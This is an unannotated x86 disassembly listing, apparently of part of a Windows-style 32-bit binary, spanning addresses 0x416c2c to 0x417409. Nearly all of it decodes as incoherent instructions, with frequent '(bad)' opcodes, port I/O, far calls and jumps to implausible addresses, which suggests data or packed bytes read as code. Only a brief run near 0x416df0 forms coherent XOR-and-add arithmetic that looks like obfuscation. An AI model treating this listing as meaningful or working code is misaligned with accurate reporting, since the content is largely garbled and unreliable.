  416c2c:	into   
  416c2d:	pop    esi
  416c2e:	sub    eax,0x867057be
  416c33:	js     0x416bc5
  416c35:	rol    esi,0xda
  416c38:	push   ebp
  416c39:	sub    al,0x3
  416c3b:	sub    ebx,DWORD PTR [ebx-0x11b47a4a]
  416c41:	imul   edx,DWORD PTR [ecx+0x17],0x6e
  416c45:	dec    edx
  416c46:	pushf  
  416c47:	mov    BYTE PTR [ebx],bl
  416c49:	and    eax,0xc93f82cc
  416c4e:	(bad)  
  416c4f:	stc    
  416c50:	cwde   
  416c51:	and    al,0xc3
  416c53:	shl    BYTE PTR [ebx],cl
  416c55:	stc    
  416c56:	out    0x5d,al
  416c58:	pushf  
  416c59:	jne    0x416c4a
  416c5b:	and    BYTE PTR [ecx-0x5f93a267],al
  416c61:	sar    DWORD PTR [ebp+0x27],1
  416c64:	add    DWORD PTR [edi-0x5c],ebx
  416c67:	test   BYTE PTR ds:0x758bf0f6,bl
  416c6d:	and    edx,DWORD PTR [eax-0x1a]
  416c70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c71:	(bad)  
  416c72:	icebp  
  416c73:	add    BYTE PTR [ebp+ebx*2-0x69],ah
  416c77:	rcr    DWORD PTR [eax],1
  416c79:	mov    BYTE PTR [edi-0x2],al
  416c7c:	mov    ds:0x34bab268,eax
  416c81:	mov    edx,DWORD PTR [eax+0x15]
  416c84:	jge    0x416ce5
  416c86:	jne    0x416c2e
  416c88:	aaa    
  416c89:	ror    BYTE PTR [eax+0x21d8ddaf],cl
  416c8f:	sbb    BYTE PTR [edi-0x36],ah
  416c92:	dec    eax
  416c93:	xchg   ebp,eax
  416c94:	add    BYTE PTR [ebx],ch
  416c96:	std    
  416c97:	aad    0xed
  416c99:	dec    ecx
  416c9a:	fwait
  416c9b:	imul   ecx
  416c9d:	xor    ebx,DWORD PTR [esi]
  416c9f:	inc    ebp
  416ca0:	loope  0x416d1c
  416ca2:	loop   0x416c93
  416ca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ca6:	stc    
  416ca7:	and    ah,BYTE PTR [eax]
  416ca9:	faddp  st(5),st
  416cab:	and    edx,edi
  416cad:	mov    esp,0x2f9e3a5
  416cb2:	in     al,0x12
  416cb4:	adc    al,0xc1
  416cb6:	(bad)  
  416cb7:	aam    0xe5
  416cb9:	mov    al,BYTE PTR [esi+0x78]
  416cbc:	or     esi,esp
  416cbe:	sbb    al,0xab
  416cc0:	mov    ecx,0x9486ac50
  416cc5:	jbe    0x416cd2
  416cc7:	inc    ebx
  416cc8:	imul   edi,DWORD PTR [ecx+0x6c],0x34
  416ccc:	inc    edi
  416ccd:	js     0x416c8d
  416ccf:	push   ecx
  416cd0:	iret   
  416cd1:	adc    ebx,esp
  416cd3:	mov    esi,0x31270859
  416cd8:	sub    bl,BYTE PTR [edx-0x8]
  416cdb:	aaa    
  416cdc:	or     BYTE PTR [ebp-0x3f242f56],ah
  416ce2:	mov    esi,0x51fc5167
  416ce7:	mov    cs,ecx
  416ce9:	dec    ebp
  416cea:	pop    edx
  416ceb:	shl    DWORD PTR [esi+0x2bdf39aa],0x8d
  416cf2:	bound  esi,QWORD PTR cs:[ebx+0x68]
  416cf6:	jp     0x416c87
  416cf8:	and    DWORD PTR [edi],ebp
  416cfa:	ds das 
  416cfc:	mov    dl,0x5c
  416cfe:	les    edi,FWORD PTR [esi]
  416d00:	xchg   DWORD PTR [esi+0x2b426f1b],edi
  416d06:	push   0x55
  416d08:	mov    al,0x9d
  416d0a:	pop    ds
  416d0b:	mov    ebp,0x96cf8a6a
  416d10:	adc    al,0x4b
  416d12:	leave  
  416d13:	mov    ch,0xfb
  416d15:	test   BYTE PTR [ecx+0x6f7eac3c],ch
  416d1b:	jbe    0x416cba
  416d1d:	pusha  
  416d1e:	scas   al,BYTE PTR es:[edi]
  416d1f:	pop    edx
  416d20:	cmp    eax,DWORD PTR [ecx+0x74]
  416d23:	push   ecx
  416d24:	lods   al,BYTE PTR ds:[esi]
  416d25:	inc    ebx
  416d26:	dec    edx
  416d27:	add    edx,ebp
  416d29:	jle    0x416d74
  416d2b:	or     ecx,0xda6b66bd
  416d31:	adc    edx,eax
  416d33:	and    DWORD PTR [ebx-0x6],ebx
  416d36:	xor    DWORD PTR ds:0xf0e1255d,esi
  416d3c:	ret    
  416d3d:	add    eax,0x537fc8e0
  416d42:	mov    al,ds:0xd2c9f3bd
  416d47:	ins    DWORD PTR es:[edi],dx
  416d48:	mov    ah,0xf3
  416d4a:	ins    BYTE PTR es:[edi],dx
  416d4b:	pop    eax
  416d4c:	push   cs
  416d4d:	neg    DWORD PTR [edi+0x4f3b3e8a]
  416d53:	xchg   si,ax
  416d55:	enter  0x2b7,0x1
  416d59:	enter  0x61c7,0x7f
  416d5d:	stos   BYTE PTR es:[edi],al
  416d5e:	loopne 0x416d38
  416d60:	stc    
  416d61:	cs jl  0x416d80
  416d64:	jno    0x416ce7
  416d66:	xchg   esp,eax
  416d67:	(bad)  
  416d68:	or     al,0x3c
  416d6a:	push   ebp
  416d6b:	push   edx
  416d6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d6d:	mov    al,0xd3
  416d6f:	cld    
  416d70:	aaa    
  416d71:	cmp    eax,0xe0fa6cc6
  416d76:	dec    ecx
  416d77:	into   
  416d78:	inc    edx
  416d79:	fs ja  0x416d2f
  416d7c:	mov    dh,0x29
  416d7e:	push   esp
  416d7f:	xor    DWORD PTR [ebx],0xffffff85
  416d82:	fcmovb st,st(3)
  416d84:	mov    ebp,0x918acc08
  416d89:	xchg   DWORD PTR [eax+0x70ae33e2],ebp
  416d8f:	fisub  WORD PTR [edi+0x1f]
  416d92:	cmp    DWORD PTR [eax-0x48bce7f5],eax
  416d98:	add    eax,0x68c0739e
  416d9d:	in     al,dx
  416d9e:	mov    DWORD PTR [edx],eax
  416da0:	rol    al,cl
  416da2:	xchg   ebp,eax
  416da3:	xchg   ecx,eax
  416da4:	mov    BYTE PTR [eax],ch
  416da6:	add    eax,0x377e00a8
  416dab:	sub    al,0xb8
  416dad:	push   eax
  416dae:	sub    eax,DWORD PTR [edi-0x6fa3d95e]
  416db4:	sar    BYTE PTR [esi],cl
  416db6:	push   0x2bab0c3c
  416dbb:	mov    ecx,0xf4cf2aef
  416dc0:	sbb    eax,0xe7a9f84f
  416dc5:	shr    DWORD PTR [eax-0x59ebe93c],1
  416dcb:	pop    es
  416dcc:	sub    bl,al
  416dce:	dec    ebp
  416dcf:	test   eax,0x109e750d
  416dd4:	call   0x5fdf:0x7e6d28b3
  416ddb:	aas    
  416ddc:	sahf   
  416ddd:	inc    ebp
  416dde:	pop    ebx
  416ddf:	pop    esi
  416de0:	repz call 0x3f6:0x21670df6
  416de8:	adc    eax,0xf9b0663f
  416ded:	adc    DWORD PTR [ebx],esi
  416def:	(bad)  
  416df0:	add    eax,edi
  416df2:	add    edx,edi
  416df4:	imul   eax,edx
  416df7:	add    eax,DWORD PTR [ebp-0xc]
  416dfa:	mov    DWORD PTR [ebp-0xc],eax
  416dfd:	mov    eax,DWORD PTR [ebp-0xc]
  416e00:	mov    edx,DWORD PTR [ebp-0x20]
  416e03:	sub    eax,edi
  416e05:	sub    edx,edi
  416e07:	xor    eax,esi
  416e09:	xor    edx,esi
  416e0b:	cmp    edx,eax
  416e0d:	jne    0x4102d1
  416e13:	mov    eax,DWORD PTR [ebp-0x1c]
  416e16:	mov    edx,DWORD PTR [ebp-0x20]
  416e19:	xor    eax,esi
  416e1b:	add    eax,edi
  416e1d:	imul   eax,edx
  416e20:	mov    edx,DWORD PTR [ebp-0x24]
  416e23:	xor    edx,esi
  416e25:	add    edx,edi
  416e27:	or     eax,edx
  416e29:	mov    edx,DWORD PTR [ebp-0x18]
  416e2c:	xor    edx,esi
  416e2e:	add    eax,edx
  416e30:	mov    edx,DWORD PTR [ebp-0x18]
  416e33:	xor    edx,esi
  416e35:	add    eax,edx
  416e37:	mov    edx,DWORD PTR [ebp-0x10]
  416e3a:	lea    eax,[eax+edx*1+0x64e5b6]
  416e41:	jmp    0x4191ca
  416e46:	jmp    0x4191bb
  416e4b:	push   ebx
  416e4c:	ja     0x416e99
  416e4e:	cmp    BYTE PTR [ebx],ch
  416e50:	add    al,0xe3
  416e52:	adc    esp,ebp
  416e54:	xchg   edx,eax
  416e55:	push   edx
  416e56:	mov    al,0x98
  416e58:	jge    0x416e85
  416e5a:	out    dx,al
  416e5b:	mov    bh,0x24
  416e5d:	popa   
  416e5e:	bound  ecx,QWORD PTR [edx]
  416e60:	pop    edi
  416e61:	bound  esp,QWORD PTR [edx+0x2a]
  416e64:	ds jo  0x416e1d
  416e67:	icebp  
  416e68:	xchg   DWORD PTR [ebx-0x5d3fa00a],esi
  416e6e:	out    dx,al
  416e6f:	xchg   ecx,eax
  416e70:	add    esp,edi
  416e72:	(bad)  
  416e73:	lods   al,BYTE PTR ds:[esi]
  416e74:	push   ecx
  416e75:	hlt    
  416e76:	inc    esp
  416e77:	ds mov esp,0x76815deb
  416e7d:	mov    esp,DWORD PTR [eax]
  416e7f:	cdq    
  416e80:	xor    al,0x86
  416e82:	push   edi
  416e83:	neg    DWORD PTR [esi]
  416e85:	loopne 0x416ef5
  416e87:	js     0x416e7b
  416e89:	adc    eax,esi
  416e8b:	xor    eax,0xe4eb4a3f
  416e90:	dec    ebp
  416e91:	sbb    cl,BYTE PTR [ecx-0x3a]
  416e94:	push   esi
  416e95:	add    eax,esi
  416e97:	outs   dx,DWORD PTR ds:[esi]
  416e98:	xchg   ebx,eax
  416e99:	xchg   ecx,eax
  416e9a:	(bad)  
  416e9c:	loop   0x416e24
  416e9e:	dec    eax
  416e9f:	imul   ebp,ebx,0x75
  416ea2:	ins    BYTE PTR es:[edi],dx
  416ea3:	xchg   edi,eax
  416ea4:	xchg   edi,eax
  416ea5:	leave  
  416ea6:	pop    ebp
  416ea7:	mov    ebx,0xf664ae41
  416eac:	pop    eax
  416ead:	mov    BYTE PTR [ebp-0x57],al
  416eb0:	out    dx,al
  416eb1:	fdivr  QWORD PTR [ecx+0x68]
  416eb4:	push   ss
  416eb5:	imul   ecx,DWORD PTR [eax-0x3169336f],0xd665d406
  416ebf:	push   ebx
  416ec0:	frstor [eax+eiz*1+0x5e]
  416ec4:	push   eax
  416ec5:	sbb    eax,0x9edeccb5
  416eca:	jle    0x416eaa
  416ecc:	and    DWORD PTR [eax],ebp
  416ece:	or     edi,esi
  416ed0:	mov    edx,0x75a114a0
  416ed5:	aaa    
  416ed6:	pop    ebp
  416ed7:	sbb    DWORD PTR gs:[edx-0xf],0x9fc0d1d6
  416edf:	pushf  
  416ee0:	jmp    0xa9e8d5bb
  416ee5:	stc    
  416ee6:	xor    esp,edx
  416ee8:	or     ah,bl
  416eea:	hlt    
  416eeb:	push   ds
  416eec:	fs jg  0x416eb9
  416eef:	dec    ecx
  416ef0:	fisubr WORD PTR [esi-0x54]
  416ef3:	popa   
  416ef4:	push   0xffffff87
  416ef6:	pop    ebx
  416ef7:	jmp    esi
  416ef9:	lods   al,BYTE PTR ds:[esi]
  416efa:	out    dx,al
  416efb:	(bad)  
  416efd:	or     eax,DWORD PTR [edx]
  416eff:	sbb    al,BYTE PTR [eax+0x57]
  416f02:	xchg   esi,eax
  416f03:	fbstp  TBYTE PTR [eax-0x76]
  416f06:	xchg   ecx,eax
  416f07:	repnz aas 
  416f09:	cmp    ah,bh
  416f0b:	data16 pop bx
  416f0e:	fidiv  WORD PTR [eax-0x2b3a1fdc]
  416f14:	pop    esi
  416f15:	pop    eax
  416f16:	aas    
  416f17:	sub    BYTE PTR [ebx+ecx*4+0x4195853a],ah
  416f1e:	adc    al,0x60
  416f20:	fstp   TBYTE PTR [ebp-0x7]
  416f23:	(bad)  
  416f24:	mov    esi,ebp
  416f26:	(bad)  
  416f27:	out    0xd3,al
  416f29:	cmc    
  416f2a:	ret    
  416f2b:	xchg   esi,eax
  416f2c:	jnp    0x416ed7
  416f2e:	imul   ebx,DWORD PTR [ebx],0xcd069e7b
  416f34:	enter  0x6c0b,0xe9
  416f38:	mov    bl,0xf8
  416f3a:	xchg   ebx,eax
  416f3b:	or     bl,cl
  416f3d:	xchg   ecx,eax
  416f3e:	jmp    DWORD PTR [eax]
  416f40:	cmp    BYTE PTR [ecx],cl
  416f42:	mov    ecx,0xf670d039
  416f47:	xor    ebp,DWORD PTR [ebp-0x29053197]
  416f4d:	outs   dx,BYTE PTR ds:[esi]
  416f4e:	ret    
  416f4f:	ins    BYTE PTR es:[edi],dx
  416f50:	jnp    0x416fbd
  416f52:	popa   
  416f53:	and    BYTE PTR [esi-0x58],dl
  416f56:	mov    eax,0x91c8778f
  416f5b:	popf   
  416f5c:	call   0x9afd:0x6cfebe93
  416f63:	sbb    ecx,ebx
  416f65:	inc    eax
  416f66:	scas   al,BYTE PTR es:[edi]
  416f67:	jno    0x416ef8
  416f69:	scas   al,BYTE PTR es:[edi]
  416f6a:	daa    
  416f6b:	shl    DWORD PTR [edi-0xd],1
  416f6e:	js     0x416f4b
  416f70:	sub    BYTE PTR [ebx+0x22],0x5
  416f74:	cdq    
  416f75:	outs   dx,BYTE PTR ds:[esi]
  416f76:	and    esp,DWORD PTR [ebx]
  416f78:	test   eax,0x8376e2a7
  416f7d:	cmp    edx,DWORD PTR [ebx]
  416f7f:	shl    DWORD PTR [eax+eiz*8],1
  416f82:	repnz mov BYTE PTR [edi-0x1e299fab],al
  416f89:	iret   
  416f8a:	shl    esp,cl
  416f8c:	push   ss
  416f8d:	push   eax
  416f8e:	xchg   DWORD PTR [edi-0x68],edx
  416f91:	add    al,ah
  416f93:	into   
  416f94:	call   0xaad67dc6
  416f99:	add    al,BYTE PTR [ebx+0x4566edc8]
  416f9f:	and    DWORD PTR [ebp+0x3dbdf036],0x24b13867
  416fa9:	push   esp
  416faa:	jg     0x417003
  416fac:	pop    eax
  416fad:	cmp    eax,0x4e837f2c
  416fb2:	fcomip st,st(1)
  416fb4:	pop    ecx
  416fb5:	adc    BYTE PTR [ebp+0xeefc04a],0x6c
  416fbc:	mov    ah,0x95
  416fbe:	xchg   esi,eax
  416fbf:	and    BYTE PTR [eax+eiz*2+0x66],bh
  416fc3:	daa    
  416fc4:	push   edi
  416fc5:	mov    DWORD PTR [ebx+esi*8-0x8],ebx
  416fc9:	fcomp  DWORD PTR [eax+0x57]
  416fcc:	mov    ecx,0x8431cb0a
  416fd1:	sbb    al,0xb8
  416fd3:	xchg   ebp,eax
  416fd4:	retf   
  416fd5:	xor    ch,dh
  416fd7:	sub    bl,BYTE PTR [ecx+0x1f3fde67]
  416fdd:	sbb    BYTE PTR [ebx],0x10
  416fe0:	test   BYTE PTR [ebp+0x5b446a71],bl
  416fe6:	add    BYTE PTR [ecx],ah
  416fe8:	lds    esp,FWORD PTR [ebx-0x5821a48a]
  416fee:	mov    al,0x3a
  416ff0:	scas   eax,DWORD PTR es:[edi]
  416ff1:	test   DWORD PTR [esi],esi
  416ff3:	(bad)  
  416ff4:	(bad)  [eax+0xf6cb114]
  416ffa:	bnd jns 0x41701c
  416ffd:	mov    dl,BYTE PTR [edi]
  416fff:	dec    esi
  417000:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417001:	push   0x5d47e21
  417006:	mov    eax,ds:0xce759763
  41700b:	lock mov bh,0xe
  41700e:	push   cs
  41700f:	jecxz  0x417020
  417011:	jo     0x41701d
  417013:	cmp    cl,BYTE PTR [edi]
  417015:	jo     0x417027
  417017:	cmp    ch,BYTE PTR [edi+esi*4+0x69]
  41701b:	sahf   
  41701c:	inc    edx
  41701d:	daa    
  41701e:	aas    
  41701f:	cmp    BYTE PTR [ecx+0x3c],dl
  417022:	mov    al,ds:0xca099ce6
  417027:	ins    BYTE PTR es:[edi],dx
  417028:	jbe    0x417081
  41702a:	xor    BYTE PTR [edi-0x4233fe5d],cl
  417030:	pop    esp
  417031:	and    BYTE PTR ds:0x6e4f8aae,bh
  417037:	mov    cl,0x78
  417039:	bound  esi,QWORD PTR [eax-0x38b27eb1]
  41703f:	stc    
  417040:	cmp    al,0x5b
  417042:	leave  
  417043:	and    DWORD PTR [esi+0x1991a539],0x5a
  41704a:	adc    al,0x99
  41704c:	loope  0x41706f
  41704e:	xor    eax,0x996f5776
  417053:	xchg   edi,eax
  417054:	adc    eax,0x41c4daee
  417059:	js     0x417012
  41705b:	or     esi,DWORD PTR [ecx]
  41705d:	sbb    eax,0xef1d5599
  417062:	pop    ecx
  417063:	mov    eax,0x9bf329bb
  417068:	cld    
  417069:	mov    ah,0xd0
  41706b:	mov    esi,0x8af2e331
  417070:	mov    al,ds:0x62e9317b
  417075:	sub    bl,BYTE PTR [eax]
  417077:	mov    cl,0xbc
  417079:	in     al,dx
  41707a:	cwde   
  41707b:	mov    esp,DWORD PTR [esi-0x25]
  41707e:	pop    esp
  41707f:	adc    DWORD PTR [ecx+0x3f],0x73
  417083:	loop   0x41701e
  417085:	or     ebp,DWORD PTR ds:0xc3daf199
  41708b:	inc    eax
  41708c:	sbb    al,0x6d
  41708e:	mov    cl,0xd4
  417090:	jnp    0x41709d
  417092:	sub    eax,0xfb8be50d
  417097:	fldcw  WORD PTR [ecx+ecx*1-0x14a4d3a4]
  41709f:	fcomp  DWORD PTR [edi+0x4f]
  4170a2:	ins    DWORD PTR es:[edi],dx
  4170a3:	fdiv   QWORD PTR [ecx]
  4170a5:	scas   al,BYTE PTR es:[edi]
  4170a6:	mov    esp,0x6ebd3
  4170ab:	pop    esi
  4170ac:	inc    eax
  4170ad:	enter  0xe156,0x1c
  4170b1:	pop    edx
  4170b2:	adc    ebx,DWORD PTR [edi]
  4170b4:	xor    BYTE PTR [eax],ah
  4170b6:	dec    edx
  4170b7:	add    al,0x52
  4170b9:	jne    0x4170c5
  4170bb:	add    al,0xff
  4170bd:	shl    DWORD PTR [esp+edi*2],0xf9
  4170c1:	mov    gs,ebx
  4170c3:	cmp    ecx,DWORD PTR [ecx+0x3e06c051]
  4170c9:	jb     0x4170b6
  4170cb:	jbe    0x417096
  4170cd:	inc    eax
  4170ce:	dec    ebx
  4170cf:	or     al,0x60
  4170d1:	imul   edi,DWORD PTR [ecx-0x166ab8cb],0x67
  4170d8:	jo     0x417133
  4170da:	xchg   BYTE PTR [eax+0x1f39e883],bh
  4170e0:	push   eax
  4170e1:	ins    DWORD PTR es:[edi],dx
  4170e2:	fcomp  QWORD PTR [edx+0x14]
  4170e5:	dec    eax
  4170e6:	xchg   esp,eax
  4170e7:	inc    ebx
  4170e8:	je     0x41712b
  4170ea:	jle    0xbf7486e9
  4170f0:	sbb    BYTE PTR [edi+0x4876ede1],dh
  4170f6:	jb     0x417086
  4170f8:	sti    
  4170f9:	rol    BYTE PTR [ebx-0x7c7a1073],1
  4170ff:	jle    0x4170b5
  417101:	les    eax,FWORD PTR [edx-0x176b78e9]
  417107:	mov    ebp,0xbbd06df7
  41710c:	cmp    eax,0xd67ad65c
  417111:	mov    ebp,cs
  417113:	cwde   
  417114:	enter  0x45f5,0x7
  417118:	iret   
  417119:	xor    BYTE PTR [esi-0x49],ch
  41711c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41711d:	push   es
  41711e:	int    0x7
  417120:	cdq    
  417121:	repnz lock push es
  417124:	call   0x89cb2c35
  417129:	push   ecx
  41712a:	bound  ecx,QWORD PTR [eax-0x41]
  41712d:	stc    
  41712e:	push   ebx
  41712f:	test   al,0x82
  417131:	xchg   ebx,eax
  417132:	in     eax,dx
  417133:	ret    
  417134:	ror    DWORD PTR cs:[eax+0x10],cl
  417138:	push   esi
  417139:	add    BYTE PTR es:[eax+0x3437aea0],al
  417140:	adc    DWORD PTR [esi-0x31],ebp
  417143:	pop    ecx
  417144:	push   cs
  417145:	daa    
  417146:	repz addr16 pushf 
  417149:	xchg   esi,eax
  41714a:	fldenv [ebx-0x20]
  41714d:	sub    al,0xdd
  41714f:	add    DWORD PTR [eax],ecx
  417151:	retf   0x6257
  417154:	dec    ecx
  417155:	and    al,0xab
  417157:	xor    esp,eax
  417159:	adc    edi,0x59aed5c1
  41715f:	or     bl,BYTE PTR [esi+0x60]
  417162:	enter  0x2858,0x41
  417166:	outs   dx,BYTE PTR ds:[esi]
  417167:	sub    ecx,DWORD PTR [ebp+esi*1+0x42]
  41716b:	int    0xaa
  41716d:	or     al,0xd3
  41716f:	sub    eax,0x4291c124
  417174:	cli    
  417175:	out    dx,al
  417176:	not    BYTE PTR [ecx-0x6f2efced]
  41717c:	mov    ah,0x87
  41717e:	gs test al,0x4b
  417181:	add    eax,0xdcdee742
  417186:	sbb    bh,BYTE PTR [ebp-0xa]
  417189:	lock add al,BYTE PTR [eax+0x581169af]
  417190:	mov    esi,0x56604771
  417195:	add    BYTE PTR [ebx+0x5c],al
  417198:	mov    ds:0xe41710d5,eax
  41719d:	iret   
  41719e:	and    eax,0xb213aa44
  4171a3:	sub    eax,0xd82e87cc
  4171a8:	out    0x72,al
  4171aa:	or     DWORD PTR [esi],eax
  4171ac:	mov    BYTE PTR [eax+0x75],ah
  4171af:	je     0x417173
  4171b1:	cld    
  4171b2:	outs   dx,DWORD PTR ds:[esi]
  4171b3:	ins    BYTE PTR es:[edi],dx
  4171b4:	sub    DWORD PTR [edi],0xb5a34dd0
  4171ba:	(bad)  
  4171bc:	push   es
  4171bd:	ret    
  4171be:	mov    BYTE PTR ds:0x51be6191,ah
  4171c4:	add    BYTE PTR [ebp+0x72],bl
  4171c7:	in     eax,0xab
  4171c9:	pop    ebp
  4171ca:	pop    ds
  4171cb:	mov    ebx,0xd8a4e603
  4171d0:	call   0x15aa:0xf864b33f
  4171d7:	sub    edi,DWORD PTR [esi]
  4171d9:	out    dx,eax
  4171da:	sahf   
  4171db:	adc    DWORD PTR es:[ebx-0x55],ebp
  4171df:	mov    bh,0x60
  4171e1:	inc    esi
  4171e2:	out    dx,al
  4171e3:	call   DWORD PTR [ecx-0x29]
  4171e6:	icebp  
  4171e7:	les    esi,FWORD PTR [ecx]
  4171e9:	inc    BYTE PTR [esi-0x5d81f09a]
  4171ef:	push   0xb0daa01c
  4171f4:	sbb    eax,0xfad67c59
  4171f9:	arpl   WORD PTR [eax+edi*4+0x7d995aa5],dx
  417200:	inc    edi
  417201:	push   edx
  417202:	dec    ebx
  417203:	dec    esi
  417204:	std    
  417205:	push   ds
  417206:	mov    eax,ds:0xf4b00864
  41720b:	mov    bh,0xa3
  41720d:	div    BYTE PTR [esi+0x72]
  417210:	mov    eax,gs:0xd749f9fb
  417216:	jmp    0xacf29527
  41721b:	retf   0x4617
  41721e:	sbb    edi,DWORD PTR [ebx+0x41530f85]
  417224:	mov    eax,ds:0x447631a4
  417229:	adc    DWORD PTR [esi+0x52c6dfed],edx
  41722f:	and    BYTE PTR [edi-0x5f],dl
  417232:	mov    ebp,0xebda61ea
  417237:	add    BYTE PTR [eax+esi*2],bh
  41723a:	data16 mov ds:0xe8fede22,al
  417240:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  417242:	mov    dh,0x22
  417244:	dec    ebp
  417245:	push   esp
  417246:	dec    ebp
  417247:	or     DWORD PTR [esi+eiz*8-0x40],esp
  41724b:	ins    DWORD PTR es:[edi],dx
  41724c:	and    bl,0x7f
  41724f:	test   al,0x76
  417251:	cdq    
  417252:	enter  0x22a,0x26
  417256:	add    DWORD PTR [edi-0x22f37327],esp
  41725c:	sar    DWORD PTR [ebp-0x66ee89c8],cl
  417262:	jo     0x4171fb
  417264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417265:	gs in  al,0x25
  417268:	add    eax,0x9632cc79
  41726d:	fidivr WORD PTR [eax+0x39]
  417270:	outs   dx,DWORD PTR ds:[esi]
  417271:	cld    
  417272:	fisubr DWORD PTR [eax]
  417274:	push   eax
  417275:	dec    ecx
  417276:	xor    eax,0x1b183fee
  41727b:	jo     0x4172b2
  41727d:	es inc ebp
  41727f:	(bad)  
  417280:	test   eax,0x7e7f06f7
  417285:	adc    eax,0xab9f6910
  41728a:	jge    0x4172d0
  41728c:	mov    WORD PTR [ebp+0x70],?
  41728f:	enter  0x17f3,0x78
  417293:	mov    fs,WORD PTR [edx]
  417295:	(bad)  
  417296:	outs   dx,DWORD PTR ds:[esi]
  417297:	and    ch,ah
  417299:	imul   esp,DWORD PTR [esi+0x1f],0x17
  41729d:	mov    ds:0xd5d35903,al
  4172a2:	sub    al,0x5d
  4172a4:	xlat   BYTE PTR ds:[ebx]
  4172a5:	jmp    0x417260
  4172a7:	xor    eax,0x71c0ab66
  4172ac:	loop   0x417264
  4172ae:	rcr    DWORD PTR [esi],cl
  4172b0:	or     eax,0xc7b2b77c
  4172b5:	push   esp
  4172b6:	sbb    esp,0x72dbbd03
  4172bc:	fadd   st(7),st
  4172be:	mov    edi,eax
  4172c0:	pop    ecx
  4172c1:	xchg   edx,eax
  4172c2:	sub    BYTE PTR [ebx],cl
  4172c4:	cdq    
  4172c5:	das    
  4172c6:	bound  edx,QWORD PTR [ebp+0x45223179]
  4172cc:	in     al,dx
  4172cd:	ret    0x7e41
  4172d0:	xor    DWORD PTR [edi],0xa2dff78
  4172d6:	in     eax,0x92
  4172d8:	and    BYTE PTR [ebp+0x4af0ad4f],al
  4172de:	leave  
  4172df:	push   edi
  4172e0:	or     eax,0x667e8f25
  4172e5:	pop    ss
  4172e6:	mov    eax,es:0x16bd800e
  4172ec:	ret    0x13dd
  4172ef:	pop    ds
  4172f0:	xchg   esp,eax
  4172f1:	test   BYTE PTR [ebx-0x5a9c3222],dl
  4172f7:	outs   dx,DWORD PTR ds:[esi]
  4172f8:	rcr    eax,1
  4172fa:	jo     0x417365
  4172fc:	pop    ds
  4172fd:	nop
  4172fe:	jne    0x417359
  417300:	inc    eax
  417301:	and    bh,cl
  417303:	mov    edi,0x3da61567
  417308:	cli    
  417309:	pop    ebx
  41730a:	sbb    ebp,DWORD PTR [edx]
  41730c:	mov    eax,ds:0x3d04e89c
  417311:	xor    esi,esp
  417313:	fcmove st,st(5)
  417315:	(bad)  
  417316:	mov    bh,0xe7
  417318:	aad    0x2f
  41731a:	sbb    al,0x89
  41731c:	xchg   ebp,eax
  41731d:	push   ebp
  41731e:	sub    ebx,edx
  417320:	push   ebp
  417321:	stos   BYTE PTR es:[edi],al
  417322:	rol    BYTE PTR ds:0xb2614df5,cl
  417328:	push   esp
  417329:	xlat   BYTE PTR ds:[ebx]
  41732a:	cmp    al,0x1b
  41732c:	imul   BYTE PTR [eax+0x33]
  41732f:	push   es
  417330:	jmp    0xd99a88e
  417335:	in     eax,0x66
  417337:	loopne 0x417307
  417339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41733a:	push   eax
  41733c:	scas   eax,DWORD PTR es:[edi]
  41733d:	and    al,0x32
  41733f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417340:	daa    
  417341:	jg     0x4172f5
  417343:	pop    gs
  417345:	out    0xa4,eax
  417347:	ins    DWORD PTR es:[edi],dx
  417348:	adc    ebp,DWORD PTR [eax]
  41734a:	retf   
  41734b:	and    DWORD PTR [ebx],0x8
  41734e:	lods   eax,DWORD PTR ds:[esi]
  41734f:	test   eax,0x43aea434
  417354:	jmp    0xec71:0xd61ea824
  41735b:	or     al,0x38
  41735d:	jae    0x4173d4
  41735f:	pop    esi
  417360:	imul   edi,DWORD PTR [edi-0x3ac2b927],0xffffff93
  417367:	ffree  st(4)
  41736a:	pusha  
  41736b:	push   cs
  41736c:	es jbe 0x417342
  41736f:	or     BYTE PTR [eax],bl
  417371:	(bad)  
  417372:	retf   0x6c7a
  417375:	mov    eax,0xf74f122a
  41737a:	xchg   edi,eax
  41737b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41737c:	sti    
  41737d:	xchg   ebx,eax
  41737e:	adc    BYTE PTR [edi],cl
  417380:	sub    eax,0xace0eb93
  417385:	fisubr WORD PTR [eax]
  417387:	int    0xe0
  417389:	dec    edx
  41738a:	shl    DWORD PTR [ebx+0x4365afea],cl
  417390:	mov    edx,?
  417392:	mov    al,ds:0x5aaf6daf
  417397:	dec    ebx
  417398:	dec    ebp
  417399:	push   0xd34adcf3
  41739e:	push   eax
  41739f:	or     eax,0x450cf028
  4173a4:	les    esp,FWORD PTR [ecx-0x463712d7]
  4173aa:	cdq    
  4173ab:	jae    0x417407
  4173ad:	aad    0x6c
  4173af:	int    0x14
  4173b1:	arpl   dx,bp
  4173b3:	push   0x378b07da
  4173b8:	mov    edi,0x2e04cae5
  4173bd:	xchg   ebx,eax
  4173be:	dec    ebp
  4173bf:	add    esi,ebp
  4173c1:	or     DWORD PTR [esi-0x64543e7],esi
  4173c7:	adc    dh,ah
  4173c9:	out    dx,eax
  4173ca:	jl     0x4173a0
  4173cc:	imul   edx,DWORD PTR [edx+0x3cd4cf0e],0xffffffa8
  4173d3:	arpl   WORD PTR ds:0xdaa276ec,si
  4173d9:	push   eax
  4173da:	mov    ds:0x89482e1d,eax
  4173df:	xchg   ebx,esi
  4173e1:	outs   dx,DWORD PTR ds:[esi]
  4173e2:	cdq    
  4173e3:	and    eax,0x45077af5
  4173e8:	not    al
  4173ea:	sbb    al,0x76
  4173ec:	pop    edi
  4173ed:	mov    ebx,0xeec77a83
  4173f2:	mov    WORD PTR [edi],fs
  4173f4:	xor    eax,0x57c9568b
  4173f9:	cs xchg ecx,eax
  4173fb:	jl     0x41746f
  4173fd:	ret    0x315a
  417400:	sub    bh,bh
  417402:	xor    al,BYTE PTR [edi-0x44f1853c]
  417408:	inc    esp
  417409:	lds    edi,FWORD PTR [eax]
